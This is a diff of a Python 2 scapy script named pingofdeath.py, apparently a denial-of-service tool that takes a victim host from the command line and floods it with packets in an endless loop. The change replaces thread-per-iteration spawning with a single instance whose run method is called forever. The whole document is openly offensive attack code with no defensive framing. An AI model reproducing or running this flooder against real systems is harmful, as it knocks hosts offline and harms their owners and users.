@@ -2,14 +2,14 @@
 #author Aiden
 
 from scapy.all import *
-import random , threading ,re ,sys 
+import random  ,re ,sys 
 
 if len(sys.argv) != 2:
 	print "Usage: pingofdeath.py <target>"
 	sys.exit(1) 
 victim = sys.argv[1]
 
-class pingofdeath(threading.Thread):
+class pingofdeath:
 	try:
 		def check(self):
 			global target,victim
@@ -24,8 +24,6 @@ class pingofdeath(threading.Thread):
 				host = m.group(2)
 				target = socket.gethostbyname(host)
 
-		def __init__(self):
-			threading.Thread.__init__(self)
 		def run(self):
 			self.check()
 			i = IP()
@@ -42,6 +40,7 @@ class pingofdeath(threading.Thread):
 	except:
 		print 'Victim not available!'
 		sys.exit(1)
-
+ping = pingofdeath()
 while True:
-	pingofdeath().start()
+	ping.run()
+	
